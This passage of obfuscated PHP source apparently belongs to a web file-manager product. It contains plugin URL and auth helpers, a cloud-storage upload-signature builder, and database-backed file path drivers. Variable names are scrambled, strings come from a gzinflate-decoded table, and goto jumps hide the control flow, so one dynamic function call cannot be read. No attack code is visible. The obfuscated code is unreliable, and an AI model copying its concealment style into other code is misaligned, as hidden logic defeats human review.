$cÛäŠöãƒ = explode($d§ÁœãŠ¸ë[229], $C†£«»¨ïÒ); if (count($cÛäŠöãƒ) < $d§ÁœãŠ¸ë[592]) { $aìÒèãÑÔ³ = $d§ÁœãŠ¸ë[789]; $aìÒèãÑÔ³(); } goto D“‚ƒé¾í ; cŞéò¿œøè: } return $this->modelPlugin->setConfig($this->pluginName, $AÌˆ‚š¬‚¥); } public function onSetConfig($dÌÙË²›) { } public function onGetConfig($e²Â×±ÛÇ) { } public function onChangeStatus($eœîíÆ’…ã) { } public function onUninstall() { } public function onInstall() { } public function authCheck($DÈ—Óƒˆ‰ = "\x70\x6c\165\x67\151\156\x41\165\164\x68") { $f®äÉ©ŸóŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($f®äÉ©ŸóŠ[454])) { return !1; } if (_get($GLOBALS, $f®äÉ©ŸóŠ[485])) { return !0; } $c‰ã…•Î• = $this->getConfig(); if (!$c‰ã…•Î•[$DÈ—Óƒˆ‰]) { return !1; } return ActionCall($f®äÉ©ŸóŠ[1450], $c‰ã…•Î•[$DÈ—Óƒˆ‰]); } public function url($cíÚÓİ³äè, $fõÙÆÊå§ = '', $b‚¸½Ã¹×” = true) { goto c¬¶ëãÖ‚; B“…Š¤ßÍÚ: $eöè›ğ³ˆˆ = $this->packageVersion(); $eë‡ÅšğÌƒ = $bÑöƒ‡ƒÌÅ . $A´ÃÃªÃ‚’[440] . $eöè›ğ³ˆˆ; if (substr($cíÚÓİ³äè, 0, 4) == $A´ÃÃªÃ‚’[147] || substr($cíÚÓİ³äè, 0, 2) == $A´ÃÃªÃ‚’[1236]) { $cÑ•á­¨éá = $cíÚÓİ³äè . $A´ÃÃªÃ‚’[1451] . $eë‡ÅšğÌƒ; } else { if ($fõÙÆÊå§ == $A´ÃÃªÃ‚’[33]) { $cÑ•á­¨éá = $this->pluginHost . $cíÚÓİ³äè . $A´ÃÃªÃ‚’[1451] . $eë‡ÅšğÌƒ; } else { if ($fõÙÆÊå§ === $A´ÃÃªÃ‚’[77]) { $cÑ•á­¨éá = $this->pluginHost . $cíÚÓİ³äè; } else { if ($fõÙÆÊå§ == $A´ÃÃªÃ‚’[1452]) { $cÑ•á­¨éá = STATIC_PATH . $cíÚÓİ³äè . $A´ÃÃªÃ‚’[1451] . $bÑöƒ‡ƒÌÅ; } else { if ($fõÙÆÊå§ == $A´ÃÃªÃ‚’[1453]) { $cÑ•á­¨éá = APP_HOST . $A´ÃÃªÃ‚’[1454] . $cíÚÓİ³äè . $A´ÃÃªÃ‚’[1451] . $bÑöƒ‡ƒÌÅ; } else { if (isset($bÕæ„É®ù[$fõÙÆÊå§])) { $cÑ•á­¨éá = $bÕæ„É®ù[$fõÙÆÊå§] . $cíÚÓİ³äè . $A´ÃÃªÃ‚’[1451] . $eë‡ÅšğÌƒ; } } } } } } goto b‡ƒùïÎë; b‡ƒùïÎë: if (!$b‚¸½Ã¹×”) { return $cÑ•á­¨éá; } echo $cÑ•á­¨éá; goto a¸ğ‚ëøç÷; c¬¶ëãÖ‚: $A´ÃÃªÃ‚’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÕæ„É®ù = $this->getConfig(); $bÑöƒ‡ƒÌÅ = KOD_VERSION . $A´ÃÃªÃ‚’[95] . KOD_VERSION_BUILD; goto B“…Š¤ßÍÚ; a¸ğ‚ëøç÷: } public function link($Dº¸èÃÁ¥ = false, $A—ãñ‚ªµ§ = '') { $EÏÂœë =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Dº¸èÃÁ¥) { $this->link($EÏÂœë[1455], $EÏÂœë[1453]); $this->link($EÏÂœë[1456], $EÏÂœë[1452]); $this->link($EÏÂœë[1457], $EÏÂœë[1452]); $this->link($EÏÂœë[1458], $EÏÂœë[1452]); $this->link($EÏÂœë[1459], $EÏÂœë[1452]); return; } $d°»¦ª‰­õ = $this->url($Dº¸èÃÁ¥, $A—ãñ‚ªµ§, !1); if (substr($Dº¸èÃÁ¥, -3) == $EÏÂœë[1460]) { echo $EÏÂœë[1461] . $d°»¦ª‰­õ . $EÏÂœë[1462] . $EÏÂœë[229]; } else { if (substr($Dº¸èÃÁ¥, -4) == $EÏÂœë[1463]) { echo $EÏÂœë[1464] . $d°»¦ª‰­õ . $EÏÂœë[1465] . $EÏÂœë[229]; } } } } goto bù¼„ÙõÁ§; FİÇÃ±ˆ‡: $C¿Áİ…Íà = $_SERVER[ÒÆ›ÆØÎ¾][574]; while ($C¿Áİ…Íà < $_SERVER[ÒÆ›ÆØÎ¾][575]) { if ($C¿Áİ…Íà >= 0) { break; } $C¿Áİ…Íà++; } $_SERVER[™ñğşİ€©ˆç] = explode($_SERVER[ÒÆ›ÆØÎ¾][576], gzinflate(substr($_SERVER[ÒÆ›ÆØÎ¾][577], 10, -8))); goto Dò‡à§“äÀ; dÊ‡¹Î½¡‚: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($AÒàÖ†˜ó) { parent::__construct($AÒàÖ†˜ó); $this->signatureVersion($_SERVER[ÒÆ›ÆØÎ¾][212]); } public function uploadFormData($bŸ•¨±“®, $b„Ú«ÚÍ¾Î = 3600) { goto CªÈ¨±¶‹Ñ; Fá™Æ™³…¥: $A÷í“Ù¢Œˆ = sha1($C–ë‰³æÍ); $bœ¡½¡¥îÅ = hash_hmac($DîÀçäÅİà[230], $A÷í“Ù¢Œˆ, $e²×”ôÛÃ×); $D½˜¿‘Ë‚Á = array($DîÀçäÅİà[1184] => $a™ñ‹ºö…Û, $DîÀçäÅİà[1188] => $f‹‹‹‚¢…³, $DîÀçäÅİà[1192] => base64_encode($C–ë‰³æÍ), $DîÀçäÅİà[1189] => $f•ç¥Î ¼ˆ, $DîÀçäÅİà[1190] => $this->accessKey, $DîÀçäÅİà[1193] => $DĞ‚ñëâÇİ, $DîÀçäÅİà[1194] => $bœ¡½¡¥îÅ, $DîÀçäÅİà[175] => $this->getHost()); goto fÑÀ‹öæò; CªÈ¨±¶‹Ñ: $DîÀçäÅİà =& $_SERVER[ÒÆ›ÆØÎ¾]; $a™ñ‹ºö…Û = $DîÀçäÅİà[192]; $f•ç¥Î ¼ˆ = $DîÀçäÅİà[230]; goto fâóº¡‘½; FÁò®²Ñ•¦: $C–ë‰³æÍ = array($DîÀçäÅİà[1182] => $bÚÁ·±®µö, $DîÀçäÅİà[1183] => array(array($DîÀçäÅİà[1184] => $a™ñ‹ºö…Û), array($DîÀçäÅİà[1185] => $this->bucket), array($DîÀçäÅİà[1186], $DîÀçäÅİà[1187], $DîÀçäÅİà[33]), array($DîÀçäÅİà[1188] => $f‹‹‹‚¢…³), array($DîÀçäÅİà[1189] => $f•ç¥Î ¼ˆ), array($DîÀçäÅİà[1190] => $this->accessKey), array($DîÀçäÅİà[1191] => $DĞ‚ñëâÇİ))); $C–ë‰³æÍ = json_encode($C–ë‰³æÍ); $e²×”ôÛÃ× = hash_hmac($DîÀçäÅİà[230], $DĞ‚ñëâÇİ, $this->secret); goto Fá™Æ™³…¥; fâóº¡‘½: $f‹‹‹‚¢…³ = $DîÀçäÅİà[1180]; $bÚÁ·±®µö = gmdate($DîÀçäÅİà[1181], time() + $b„Ú«ÚÍ¾Î); $DĞ‚ñëâÇİ = (string) time() . $DîÀçäÅİà[68] . (string) (time() + $b„Ú«ÚÍ¾Î); goto FÁò®²Ñ•¦; fÑÀ‹öæò: return $D½˜¿‘Ë‚Á; goto a‘”½‹Åäå; a‘”½‹Åäå: } public function fileOutLink($DĞáÒÑ¢“) { $BÕî·Úšø =& $_SERVER[ÒÆ›ÆØÎ¾]; if (substr($DĞáÒÑ¢“, 0, 7) == $BÕî·Úšø[1195]) { $DĞáÒÑ¢“ = $BÕî·Úšø[1196] . substr($DĞáÒÑ¢“, 7); } header($BÕî·Úšø[159] . $DĞáÒÑ¢“); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($BĞ·íÛ£Ò¡) { $this->pathParse = $BĞ·íÛ£Ò¡; $this->model = Model($_SERVER[ÒÆ›ÆØÎ¾][1197]); } public function getPath($B¹ŞíË»Æì) { return trim($B¹ŞíË»Æì, $_SERVER[ÒÆ›ÆØÎ¾][8]); } public function pathFather($fê”ç”Í”) { $eàÏŞÜ™ç† = $this->parse($fê”ç”Í”); $eàÏŞÜ™ç† = $this->infoSimple($fê”ç”Í”); return $eàÏŞÜ™ç† ? $eàÏŞÜ™ç†[$_SERVER[ÒÆ›ÆØÎ¾][478]] : !1; } public function pathThis($F³µîØ‚) { $a®¢ù¹Õˆ = $this->infoSimple($F³µîØ‚); return $a®¢ù¹Õˆ ? $a®¢ù¹Õˆ[$_SERVER[ÒÆ›ÆØÎ¾][28]] : !1; } public function getPathOuter($bƒãİ…ó‹) { if (!$bƒãİ…ó‹) { return $bƒãİ…ó‹; } $c©—‹©âº = $this->parse($bƒãİ…ó‹); return KodIO::make($c©—‹©âº[$_SERVER[ÒÆ›ÆØÎ¾][393]]); } public function copyFolderFromIO($CÕƒÈ²“Àé, $F‚ ˆÌçÜ„, $AäÀœ÷Á”, $c´ø›Ğ“¤, $C™Ô¸ŠÍ¶õ) { $Eò¶Š›“  = $this->model->copyFolderFromIO($CÕƒÈ²“Àé, $F‚ ˆÌçÜ„, $AäÀœ÷Á”, $c´ø›Ğ“¤, $C™Ô¸ŠÍ¶õ); return KodIO::make($Eò¶Š›“ ); } public function isParentOf($cäîäó, $bŒ–®‰§¿) { return $this->model->isParentOf($cäîäó, $bŒ–®‰§¿); } public function mkfile($cª–ÊÌ¢ø’, $b÷ŸùÌ¹™‡ = '', $BÆµ¹óšØ§ = REPEAT_RENAME) { $bíóÎŒè =& $_SERVER[ÒÆ›ÆØÎ¾]; $fæùÂÖäè« = $this->parse($cª–ÊÌ¢ø’); $cª–ÊÌ¢ø’ = $fæùÂÖäè«[$bíóÎŒè[393]]; for ($FÔ¥’å¾õ = 0; $FÔ¥’å¾õ < count($fæùÂÖäè«[$bíóÎŒè[1198]]); $FÔ¥’å¾õ++) { $a—Á§¦Š± = $fæùÂÖäè«[$bíóÎŒè[1198]][$FÔ¥’å¾õ]; if ($FÔ¥’å¾õ == count($fæùÂÖäè«[$bíóÎŒè[1198]]) - 1) { $cª–ÊÌ¢ø’ = $this->model->mkfile($cª–ÊÌ¢ø’, $a—Á§¦Š±, $b÷ŸùÌ¹™‡, $BÆµ¹óšØ§); break; } $cª–ÊÌ¢ø’ = $this->model->mkdir($cª–ÊÌ¢ø’, $a—Á§¦Š±, REPEAT_SKIP); } return $this->getPathOuter($cª–ÊÌ¢ø’); } public function mkdir($BÜ‘Æ¦Àµ, $eµ³Øºœ¥ = REPEAT_SKIP) { $bÂ„ä”¹êÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a¨Ä™ÁÎöè = $this->parse($BÜ‘Æ¦Àµ); $BÜ‘Æ¦Àµ = $a¨Ä™ÁÎöè[$bÂ„ä”¹êÖ[393]]; for ($CùÊ•ÜŠ’ù = 0; $CùÊ•ÜŠ’ù < count($a¨Ä™ÁÎöè[$bÂ„ä”¹êÖ[1198]]); $CùÊ•ÜŠ’ù++) { $Eß£ÏœÂä„ = $a¨Ä™ÁÎöè[$bÂ„ä”¹êÖ[1198]][$CùÊ•ÜŠ’ù]; $BÜ‘Æ¦Àµ = $this->model->mkdir($BÜ‘Æ¦Àµ, $Eß£ÏœÂä„, $eµ³Øºœ¥); } return $this->getPathOuter($BÜ‘Æ¦Àµ); } public function copyFile($dœÀòÑÍÖĞ, $bİí‚Éô–‰, $få“¬Èò = REPEAT_REPLACE) { $F•¤†Õ¬›© =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¶®ÀÄš¼î = $this->parse($bİí‚Éô–‰); $eòğ„ºÛ‚ = $this->model->copy($dœÀòÑÍÖĞ, $D¶®ÀÄš¼î[$F•¤†Õ¬›©[393]], $få“¬Èò, $D¶®ÀÄš¼î[$F•¤†Õ¬›©[76]]); return $eòğ„ºÛ‚ ? $this->getPathOuter($eòğ„ºÛ‚) : !1; } public function moveFile($F½¶Ô§×Œæ, $eŠ°¯×äÜá, $D²Ï˜Áğ = REPEAT_REPLACE) { $BŸ¡Ë¯¥×è =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bè·‡šÀ¹Ê = $this->parse($eŠ°¯×äÜá); $fÓ’Ùè»µ = $this->model->move($F½¶Ô§×Œæ, $Bè·‡šÀ¹Ê[$BŸ¡Ë¯¥×è[393]], $D²Ï˜Áğ, $Bè·‡šÀ¹Ê[$BŸ¡Ë¯¥×è[76]]); return $fÓ’Ùè»µ ? $this->getPathOuter($fÓ’Ùè»µ) : !1; } public function copy($b„‘—×‚¬, $eåâö…Ÿ¹ğ, $f› ­’ÖÛ‘ = REPEAT_REPLACE) { $DÓŒâ²¸Ş‹ = $this->parse($eåâö…Ÿ¹ğ); $Aæƒ°‘ÍÅŸ = $this->model->copy($b„‘—×‚¬, $DÓŒâ²¸Ş‹[$_SERVER[ÒÆ›ÆØÎ¾][393]], $f› ­’ÖÛ‘); return $Aæƒ°‘ÍÅŸ ? $this->getPathOuter($Aæƒ°‘ÍÅŸ) : !1; } public function moveSameAllow() { } public function move($bË«¡„ºÎ·, $DëˆÊÇÁºª, $AÀ¶ò“©Š· = REPEAT_REPLACE) { $f¼ˆ·¶ î = $this->parse($DëˆÊÇÁºª); $AŠÌ¼†” = $this->model->move($bË«¡„ºÎ·, $f¼ˆ·¶ î[$_SERVER[ÒÆ›ÆØÎ¾][393]], $AÀ¶ò“©Š·); return $AŠÌ¼†” ? $this->getPathOuter($AŠÌ¼†”) : !1; } public function remove($Aİ¦ƒœôÕ¡, $AÍÈãğ‚ = true) { return $this->model->remove($Aİ¦ƒœôÕ¡, $AÍÈãğ‚); } public function rename($c‘ëÉ‘µË³, $bñÛì¥†Š„) { $dÌšâ©ï‹Ô = $this->model->rename($c‘ëÉ‘µË³, $bñÛì¥†Š„); return $dÌšâ©ï‹Ô ? $this->getPathOuter($c‘ëÉ‘µË³) : $dÌšâ©ï‹Ô; } public function size($aÄ‡»Ğ¸ƒ×) { $cæ©Ï¨õ†â = $this->infoSimple($aÄ‡»Ğ¸ƒ×); return $cæ©Ï¨õ†â ? $cæ©Ï¨õ†â[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function infoSimple($c‡Ó®‹Ø™) { return $this->model->sourceInfo($c‡Ó®‹Ø™); } public function info($e†¥ŠÒÒƒ) { return $this->infoParse($e†¥ŠÒÒƒ); } public function infoAuth($AŒ”‚¼…) { return $this->infoParse($AŒ”‚¼…, !1, !0); } public function infoWithChildren($B¿Ó×‚‰ë›) { return $this->infoParse($B¿Ó×‚‰ë›, !0); } protected function infoParse($bİŞ¦ß×°, $EØ¶ñ¦á¶á = false, $C²Ø•¢œ¡Û = false) { if (!$EØ¶ñ¦á¶á) { return $this->model->pathInfo($bİŞ¦ß×°, $C²Ø•¢œ¡Û); } return $this->model->pathInfoMore($bİŞ¦ß×°); } public function infoFull($d ¨íÜ) { $b…Ì“¢ó°Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dö×¹’ÒÁ = explode($b…Ì“¢ó°Ç[8], $d ¨íÜ); $FÇ¬ßäöõ¢ = implode($b…Ì“¢ó°Ç[8], array_splice($Dö×¹’ÒÁ, 1)); return $this->model->pathInfoByPath($Dö×¹’ÒÁ[0], $FÇ¬ßäöõ¢); } public function hashSimple($EÆºšİ¨Ğá) { $eŠùŒˆºô· =& $_SERVER[ÒÆ›ÆØÎ¾]; $aòêß‚ˆ© = $this->infoWithChildren($EÆºšİ¨Ğá); return $aòêß‚ˆ©[$eŠùŒˆºô·[164]][$eŠùŒˆºô·[171]]; } public function hashMd5($a˜’¼Æ‚¹ì) { $bÙ—ñ¾Çò¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cçß‚Œç˜Ğ = $this->infoWithChildren($a˜’¼Æ‚¹ì); return $Cçß‚Œç˜Ğ[$bÙ—ñ¾Çò¤[164]][$bÙ—ñ¾Çò¤[170]]; } public function exist($CµĞ“Ôˆ½) { $Dà÷£ãĞˆ– =& $_SERVER[ÒÆ›ÆØÎ¾]; $cî÷ÜæÛŠö = $this->parse($CµĞ“Ôˆ½); if (!$cî÷ÜæÛŠö[$Dà÷£ãĞˆ–[76]]) { return $this->isFile($CµĞ“Ôˆ½) || $this->isFolder($CµĞ“Ôˆ½); } $dä×Ü³Ê†ä = array($Dà÷£ãĞˆ–[394] => $cî÷ÜæÛŠö[$Dà÷£ãĞˆ–[393]], $Dà÷£ãĞˆ–[28] => $cî÷ÜæÛŠö[$Dà÷£ãĞˆ–[76]]); $d¤âƒØ” = $this->model->where($dä×Ü³Ê†ä)->find(); return $d¤âƒØ” ? !0 : !1; } public function isFile($E”Ÿæˆ¬¢‰) { $c†‘®†º‘ö =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÑöĞâì®Š = $this->infoSimple($E”Ÿæˆ¬¢‰); return $eÑöĞâì®Š && $eÑöĞâì®Š[$c†‘®†º‘ö[403]] == $c†‘®†º‘ö[87] ? !1 : !0; } public function isFolder($eÍŒöì´åÇ) { $B¶¿õÜÒ¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÇù£œº¯ = $this->infoSimple($eÍŒöì´åÇ); return $aÇù£œº¯ && $aÇù£œº¯[$B¶¿õÜÒ¬[403]] == $B¶¿õÜÒ¬[87] ? !0 : !1; } public function listPath($cÆóÙğæ³, $C¢Õ¬ŸË† = false) { $dÊéàäİïÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($cÆóÙğæ³ == $dÊéàäİïÖ[33]) { return !1; } $Dõ•¢²„‘ = array($dÊéàäİïÖ[394] => $cÆóÙğæ³); if ($C¢Õ¬ŸË†) { return $this->model->listSource($Dõ•¢²„‘, -1); } return $this->model->listSource($Dõ•¢²„‘); } public function has($cØ  ¯Â„, $FÖò®©Ù±ï = false, $d†­ç™ÅÆ = null) { $e‚Ô¨ùÉÌˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D´ôÅ¡ß§  = $this->infoWithChildren($cØ  ¯Â„); if ($FÖò®©Ù±ï) { return array($e‚Ô¨ùÉÌˆ[204] => $D´ôÅ¡ß§ [$e‚Ô¨ùÉÌˆ[204]], $e‚Ô¨ùÉÌˆ[203] => $D´ôÅ¡ß§ [$e‚Ô¨ùÉÌˆ[203]]); } return $d†­ç™ÅÆ ? $D´ôÅ¡ß§ [$e‚Ô¨ùÉÌˆ[204]] : $D´ôÅ¡ß§ [$e‚Ô¨ùÉÌˆ[203]]; } public function listAll($d…£›¤Ù˜õ) { $b°õÜ³µëÂ = IO::info($this->pathParse[$_SERVER[ÒÆ›ÆØÎ¾][76]]); if (!$b°õÜ³µëÂ) { return array(); } return $this->model->listAll($d…£›¤Ù˜õ); } public function getContent($cøËèÚ Ú) { return $this->model->getContent($cøËèÚ Ú); } public function setContent($C±ª„ÖÂ§İ, $fßÏ¢¸ÆÌ• = '') { return $this->model->setContent($C±ª„ÖÂ§İ, $fßÏ¢¸ÆÌ•); } public function fileSubstr($bøÌø®×½©, $Eêã™°š½, $Eò‹Õ†°“) { return $this->model->fileSubstr($bøÌø®×½©, $Eêã™°š½, $Eò‹Õ†°“); } public function download($AƒïÒ¯Ø¿, $E¯é¨ÚÕÖŠ = '') { $Ešè´ß½‰õ = get_path_father($E¯é¨ÚÕÖŠ); $E·´ËŞÚ = get_path_this($E¯é¨ÚÕÖŠ); $c¬¡»Âå†· = $this->model->fileInfoGet($AƒïÒ¯Ø¿); $B¿´ˆç‹ = IO::copy($c¬¡»Âå†·[$_SERVER[ÒÆ›ÆØÎ¾][76]], $Ešè´ß½‰õ, !1, $E·´ËŞÚ); return $B¿´ˆç‹; } public function setModifyTime($F“§ÍÃ•¤¨, $D“›ÈàŞš¶ = '') { $DŒ‹¹½² =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$F“§ÍÃ•¤¨) { return; } $this->model->where(array($DŒ‹¹½²[410] => $F“§ÍÃ•¤¨))->save(array($DŒ‹¹½²[84] => $D“›ÈàŞš¶)); } public function upload($E¤»‘Ã·Ø‡, $Eí¬×Ñä“, $Bäß‚âï = false, $A—Œ¦‰òó = REPEAT_REPLACE) { $EÖ‡–Éò˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bœ˜­¡ = $this->parse($E¤»‘Ã·Ø‡); $FŞ°µÒ·šƒ = $this->model->addFile($bœ˜­¡[$EÖ‡–Éò˜[393]], $Eí¬×Ñä“, $bœ˜­¡[$EÖ‡–Éò˜[76]], $Bäß‚âï, $A—Œ¦‰òó); return $this->getPathOuter($FŞ°µÒ·šƒ); } public function uploadFileByID($f÷¸›–å’», $C–¯–¾Ïƒ®, $DÃÆÌË«Æ…) { $e‰óóïãŠ· =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŞßÍÌá›£ = $this->parse($f÷¸›–å’»); $b¼Ôå½¢©¥ = $this->model->addFileByFileID($eŞßÍÌá›£[$e‰óóïãŠ·[393]], $C–¯–¾Ïƒ®, $eŞßÍÌá›£[$e‰óóïãŠ·[76]], $DÃÆÌË«Æ…); return $this->getPathOuter($b¼Ôå½¢©¥); } public function addFileByRemote($FÈØåŠ¸×, $dõˆŠ’¿éê, $E¤òœ¢Ë¿Ï = array(), $F„ãÜè‰„ = '', $DÙÅ¬ëÈ¯) { $cªİ»œáøÉ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÄíÛö—ÃÌ = $this->parse($FÈØåŠ¸×); $F„ãÜè‰„ = empty($F„ãÜè‰„) ? $cÄíÛö—ÃÌ[$cªİ»œáøÉ[76]] : $F„ãÜè‰„; $B‘¬¡ÇÚœ¤ = $this->model->addFileByRemote($cÄíÛö—ÃÌ[$cªİ»œáøÉ[393]], $dõˆŠ’¿éê, $F„ãÜè‰„, $E¤òœ¢Ë¿Ï, $DÙÅ¬ëÈ¯); return $this->getPathOuter($B‘¬¡ÇÚœ¤); } public function uploadLink($d‰†§ÑÁ¦, $C‰È›ÎÏçñ = 0) { $eƒè“óñ» =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÜ­ÙÊíµ = $this->parse($d‰†§ÑÁ¦); $fÂ¢§éŸŠê = _get($GLOBALS[$eƒè“óñ»[7]], $eƒè“óñ»[1199]); $Aí³­ŒƒŠÅ = _get($GLOBALS[$eƒè“óñ»[7]], $eƒè“óñ»[1200]); $d‰†§ÑÁ¦ = Model($eƒè“óñ»[571])->createFileName($BÜ­ÙÊíµ[$eƒè“óñ»[76]], $fÂ¢§éŸŠê, $Aí³­ŒƒŠÅ); return IO::uploadLink($d‰†§ÑÁ¦, $C‰È›ÎÏçñ); } public function fileNameAuto($D¥”Ó“Ç—è, $E®Şˆö×„Ñ, $c¢œ“…¸¬ = REPEAT_REPLACE, $d¹»‡°ƒ®Ë = false) { return $this->model->fileNameAuto($D¥”Ó“Ç—è, $E®Şˆö×„Ñ, $c¢œ“…¸¬, $d¹»‡°ƒ®Ë); } public function fileNameExist($CøÅˆÄ¡â‡, $f¥‹˜¤è) { return $this->model->fileNameExist($CøÅˆÄ¡â‡, $f¥‹˜¤è); } protected function _fileOut($D‹¡êŸ–à, $bÓù£¾å ß = false, $AŸ‘âŞ¬Ë = false, $B‡‡ŒÁ‡åÁ = '', $b´ƒ“îñÄŒ = false) { goto B”‡­ƒÕÍ¡; AĞäÚˆçÄÔ: $B¨ÖÜİ·õ = $this->model->fileInfoGet($D‹¡êŸ–à); $B‡‡ŒÁ‡åÁ = $B¨ÖÜİ·õ[$e•Ù…¦¸èÓ[170]] ? $B¨ÖÜİ·õ[$e•Ù…¦¸èÓ[170]] : $B‡‡ŒÁ‡åÁ; $dÂï¹ÂåíË = isset($GLOBALS[$e•Ù…¦¸èÓ[1202]]) ? $GLOBALS[$e•Ù…¦¸èÓ[1202]] : $aÚÅ­Üó £[$e•Ù…¦¸èÓ[28]]; goto Có¥ò¡¶éò; Có¥ò¡¶éò: if ($b´ƒ“îñÄŒ) { return IO::fileOutServer($B¨ÖÜİ·õ[$e•Ù…¦¸èÓ[76]], $bÓù£¾å ß, $dÂï¹ÂåíË, $B‡‡ŒÁ‡åÁ); } IO::fileOut($B¨ÖÜİ·õ[$e•Ù…¦¸èÓ[76]], $bÓù£¾å ß, $dÂï¹ÂåíË, $B‡‡ŒÁ‡åÁ); goto B¥¹…¿Ç¦‰; B”‡­ƒÕÍ¡: $e•Ù…¦¸èÓ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÚÅ­Üó £ = $this->model->sourceInfo($D‹¡êŸ–à); if ($aÚÅ­Üó £[$e•Ù…¦¸èÓ[403]] == $e•Ù…¦¸èÓ[87]) { header($e•Ù…¦¸èÓ[1201]); die; } goto AĞäÚˆçÄÔ; B¥¹…¿Ç¦‰: } public function fileOut($d»»ğÜ®ä™, $A›ƒÒØƒ¢ã = false, $e‰µÉ¥¢…Ò = false, $e”ÒŸ†–¡ = '') { $this->_fileOut($d»»ğÜ®ä™, $A›ƒÒØƒ¢ã, $e‰µÉ¥¢…Ò, $e”ÒŸ†–¡); } public function fileOutServer($dğöÛİâÏ•, $dÛŠŞ‚âê® = false, $fÍº¼–Š°ğ = false, $bäÔíóßæ = '') { $this->_fileOut($dğöÛİâÏ•, $dÛŠŞ‚âê®, $fÍº¼–Š°ğ, $bäÔíóßæ, !0); } protected function _fileOutImage($CÌßöì‚Ø, $fšÉì±ó† = 250) { goto FŒ‡‚Ñ¸ù‹; FŒ‡‚Ñ¸ù‹: $bÚ¦¡ºÜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÌ×èÓÃÚ = $this->model->pathInfo($CÌßöì‚Ø); if ($FÌ×èÓÃÚ[$bÚ¦¡ºÜ[403]] == $bÚ¦¡ºÜ[87]) { show_json($bÚ¦¡ºÜ[1203] . $CÌßöì‚Ø, !1); } goto AŸ¸™È¬ª£; EÒèñºŠäà: $GLOBALS[$bÚ¦¡ºÜ[1202]] = $c’ËÉğ›…î[$bÚ¦¡ºÜ[28]]; $GLOBALS[$bÚ¦¡ºÜ[162]] = $c’ËÉğ›…î; IO::fileOutImage($c’ËÉğ›…î[$bÚ¦¡ºÜ[76]], $fšÉì±ó†); goto b½‰²ï; AŸ¸™È¬ª£: $c’ËÉğ›…î = $this->model->fileInfoGet($CÌßöì‚Ø); $c’ËÉğ›…î[$bÚ¦¡ºÜ[28]] = $FÌ×èÓÃÚ[$bÚ¦¡ºÜ[28]]; $c’ËÉğ›…î[$bÚ¦¡ºÜ[163]] = $FÌ×èÓÃÚ[$bÚ¦¡ºÜ[163]]; goto EÒèñºŠäà; b½‰²ï: } public function fileOutImage($fë‘º”Š®, $E«ù‹í¡Øß = 250) { $this->_fileOutImage($fë‘º”Š®, $E«ù‹í¡Øß); } public function fileOutImageServer($Eº×Öï› “, $cÛ¡í¼óŠ• = 250) { $this->_fileOutImage($Eº×Öï› “, $cÛ¡í¼óŠ•); } public function link($D•ŒÆÎŒöÅ, $E•«òá£Ò = '') { $D°ÔÕ¢òÄÃ = $this->model->fileInfoGet($D•ŒÆÎŒöÅ); return IO::link($D°ÔÕ¢òÄÃ[$_SERVER[ÒÆ›ÆØÎ¾][76]], $E•«òá£Ò); } protected function parse($c¦Ø¿ˆïàô) { $D±¥ÊÊ„¿ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (strstr($c¦Ø¿ˆïàô, $D±¥ÊÊ„¿[8]) === !1) { return array($D±¥ÊÊ„¿[412] => intval($c¦Ø¿ˆïàô), $D±¥ÊÊ„¿[76] => $D±¥ÊÊ„¿[33], $D±¥ÊÊ„¿[1198] => array()); } $FÎ¼õÀç¾• = explode($D±¥ÊÊ„¿[8], trim($c¦Ø¿ˆïàô, $D±¥ÊÊ„¿[8])); if (count($FÎ¼õÀç¾•) < 2) { show_tips($c¦Ø¿ˆïàô . $D±¥ÊÊ„¿[1204]); } return array($D±¥ÊÊ„¿[412] => intval($FÎ¼õÀç¾•[0]), $D±¥ÊÊ„¿[76] => $FÎ¼õÀç¾•[1], $D±¥ÊÊ„¿[1198] => array_slice($FÎ¼õÀç¾•, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($a¤ÉóÈß) { $this->pathParse = $a¤ÉóÈß; $this->model = Model($_SERVER[ÒÆ›ÆØÎ¾][1197]); } public function getPathOuter($a’ğ÷óæí) { $bÎ˜Şùç² =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$a’ğ÷óæí) { return $a’ğ÷óæí; } $FïÅ§İ•Å˜ = $this->parse($a’ğ÷óæí); return trim(KodIO::makeShare($this->pathParse[$bÎ˜Şùç²[393]], $FïÅ§İ•Å˜[$bÎ˜Şùç²[393]]), $bÎ˜Şùç²[8]); } protected function infoParse($DƒÍ†ö­ˆƒ, $b´Éë‡äØ” = false, $AÃ„ˆøà = false) { $A­âÑÉ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fö¡ô‚ë¿ø = $this->pathParse[$A­âÑÉ[393]]; $Fç±â‚¬„Ô = trim($this->pathParse[$A­âÑÉ[1055]], $A­âÑÉ[8]); return Action($A­âÑÉ[1205])->sharePathInfo($fö¡ô‚ë¿ø, $Fç±â‚¬„Ô); } public function infoFull($E»»óÙÙºÇ) { $f§ÑÔ…Ê¹¾ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¢Œª£Šè = explode($f§ÑÔ…Ê¹¾[8], trim($E»»óÙÙºÇ, $f§ÑÔ…Ê¹¾[8])); if (count($F¢Œª£Šè) > 1) { $B¬˜ÕÌêÄ‡ = implode($f§ÑÔ…Ê¹¾[8], array_splice($F¢Œª£Šè, 1)); $DŸ‚š”„…‚ = $this->model->pathInfoByPath($F¢Œª£Šè[0], 